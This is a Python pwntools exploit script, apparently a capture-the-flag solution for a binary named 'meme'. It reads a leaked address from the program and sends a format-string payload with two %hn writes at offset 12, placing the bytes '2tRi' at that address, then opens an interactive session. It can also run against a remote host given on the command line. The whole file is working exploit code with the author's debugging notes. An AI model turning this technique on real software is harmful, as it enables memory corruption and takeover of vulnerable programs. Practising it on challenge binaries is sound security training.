from pwn import *


PROGRAM_PATH = (Path(__file__).parent / "meme").resolve().__str__()
# b * printf + 166

gdb_script = """
b *main+191
b *main+236
c
"""
# elf = ELF("./meme")
# win_addr = elf.got["win"]
# print(elf.got)

frame_size = 0x220  # 544
rbp = 8
buff_size = 0x200


def start(argv=[], *a, **kwargs):
    if args.GDB:
        return gdb.debug([PROGRAM_PATH] + argv, gdbscript=gdb_script, *a, **kwargs)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kwargs)
    else:
        return process([PROGRAM_PATH] + argv, *a, **kwargs)


phrase_byte = b"2tRiViAl"
phrase = u64(phrase_byte, endianness="little")

print(f"Phrase is: {hex(phrase)}")

io = start()
# print(io.got["printf"])
res = io.recvuntil(delims="at ")
print("____________________________________")
target = io.recvline().decode("ascii").strip()


print(f"Target addr {target}")
target = int(target, base=16)
res = io.recvuntil(delims=": ")
print(res)
print("____________________________________")

# Find the offset
# tag = 8 * b"A" * 10
# fmt = "|".join(f"{i}: %{i}$p" for i in range(1, buff_size)).encode()
# payload = tag + b"|" + fmt
# io.sendline(payload)
# offset = 8

# # Write 2tRi to the format,
# fmt = f"%50c%{offset}$n".encode("ascii")
# payload = fmt + p64(target + 0)

# WTF why did the offset change to 12 now?
offset = 12
num = u32(b"2tRi")
low_half = num & 0x0000FFFF
high_half = (num & 0xFFFF0000) >> 16
delta = (low_half - high_half) & 0xFFFF  # 2784

fmt = (f"%{high_half}c%{offset}$hn" f"%{delta}c%{offset+1}$hn").encode()

# Address order matches the %hn order used above:
payload = fmt + p64(target + 2) + p64(target)

# Optional 8‑byte alignment (only if needed):
if len(fmt) % 8:
    pad = b"A" * (8 - (len(fmt) % 8))
    payload = fmt + pad + p64(target + 2) + p64(target)

# NOTE
# Write order choice: you write high_half first (to target+2) then low_half (to target)
# so the second %hn needs only a small delta: high_half = 0x6952 low_half = 0x7432
# Delta = (low - high) = 0x0AE0 (2784 chars) – small.
# If you wrote low half first you’d need (high - low) mod 0x10000 = 0xF520 ≈ 62752 more chars before the second %hn.

print(f"Format part: {fmt}")
print(f"Payload is: {payload}")
print(f"Payload length: {len(payload)}")
io.sendline(payload)


# print("____________________________________")
# res = io.recvlines(2)
# print(res)


io.interactive()
